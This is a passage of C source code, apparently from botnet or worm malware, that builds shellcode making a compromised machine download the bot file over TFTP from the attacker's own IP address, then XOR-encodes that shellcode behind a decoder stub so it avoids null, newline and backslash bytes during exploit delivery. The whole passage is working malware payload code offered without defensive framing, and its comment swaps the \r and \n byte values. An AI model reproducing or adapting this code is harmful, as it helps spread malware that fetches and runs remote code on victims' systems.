	memcpy(buffer+i, botfilename,  BotFileNameLength); i += BotFileNameLength;
	memcpy(buffer+i, tftp_Shellcode+0x89,       0x38); i += 0x38;

	return ShellcodeSize;
}

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename)
{
	return GetRNS0EncodedSize(GetShellcodeSize(ownip, botfilename));
}

DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename)
{
	DWORD RNS0TerminatedShellcodeSize = GetRNS0TerminatedShellcodeSize(ownip, botfilename);
	if (RNS0TerminatedShellcodeSize > buffersize) return 0;
	if (RNS0TerminatedShellcodeSize > 65535) return 0;

	char *Shellcode = (char *)malloc(GetShellcodeSize(ownip, botfilename)+257);
	DWORD ShellcodeSize = GetShellcode(Shellcode, GetShellcodeSize(ownip, botfilename), ownip, botfilename);
	RNS0TerminatedShellcodeSize = EncodeRNS0(buffer, buffersize, Shellcode, ShellcodeSize);

	free(Shellcode);

	return RNS0TerminatedShellcodeSize;
}

DWORD GetRNS0EncodedSize(DWORD shellcodesize)
{
	if (!(shellcodesize & 0xFF))
		shellcodesize++;
	DWORD DecoderSize = shellcodesize <= 0xFF ? sizeof(xor255decoder)-1 : sizeof(xor65535decoder)-1;

	return DecoderSize+shellcodesize;
}

// no 0x0A (\r) - 0x0D (\n) - 0x5C (\\) - 0x00 (\0) after encoding
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize)
{
	char b = (char)(shellcodesize & 0xFF);
	if (b == 0x0A || b == 0x0D || b == 0x5C || b == 0x00)
		shellcodesize += 0x0001;

	if (shellcodesize > 0xFF) {
		b = (char)((shellcodesize >> 8) & 0xFF);
		if (b == 0x0A || b == 0x0D || b == 0x5c || b == 0x00)
			shellcodesize += 0x0100;
	}

	DWORD RNS0EncodedSize = GetRNS0EncodedSize(shellcodesize);
	if (RNS0EncodedSize > buffersize) return 0;
	if (RNS0EncodedSize > 65535) return 0;

	DWORD i, j;
	char x = xorhelp;

	// find x occurance in Shellcode buffer
	for (i = 0; i < shellcodesize; i++) {
		char result = shellcode[i]^x;
		if (result == 0x00 || result == 0x0A || result == 0x0D || result == 0x5C) {
			x++;
			i = 0;
		}
	}
	xorhelp = x;

	// set size & xor key and copy decoder
	if (shellcodesize <= 0xFF) {
		xor255decoder[DECODER255_OFFSET_SIZE]   = (char)(shellcodesize);
		xor255decoder[DECODER255_OFFSET_XORKEY] = x;
		memcpy(buffer, xor255decoder, sizeof(xor255decoder)-1);
		i = sizeof(xor255decoder)-1;
	} else {
		char *d65535os = &xor65535decoder[DECODER65535_OFFSET_SIZE];
		*(short *)d65535os = (short)(shellcodesize);
		xor65535decoder[DECODER65535_OFFSET_XORKEY] = x;
		memcpy(buffer, xor65535decoder, sizeof(xor65535decoder)-1);
		i = sizeof(xor65535decoder)-1;
	}

	// copy encoded shellcode to buffer
	for (j = 0; j < shellcodesize; j++)
		buffer[i+j] = (shellcode[j] ^ x);

	// -> bye :D
	return RNS0EncodedSize;
}

	